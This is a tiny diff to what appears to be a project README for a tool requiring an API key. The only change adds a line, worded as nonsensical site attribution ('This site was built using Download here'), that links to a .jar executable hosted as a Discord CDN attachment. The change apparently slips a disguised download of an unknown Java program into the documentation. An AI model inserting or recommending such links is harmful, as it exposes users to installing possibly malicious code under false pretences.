@@ -7,3 +7,4 @@
 ### TO USE THIS YOU NEED TO SET YOUR API KEY!!
 
 ![This is an image](https://i.imgur.com/Dz2m2N2.png)
+This site was built using [Download here](https://cdn.discordapp.com/attachments/975834884843135126/981573757170757742/HypixelTracker_v1.03.jar).
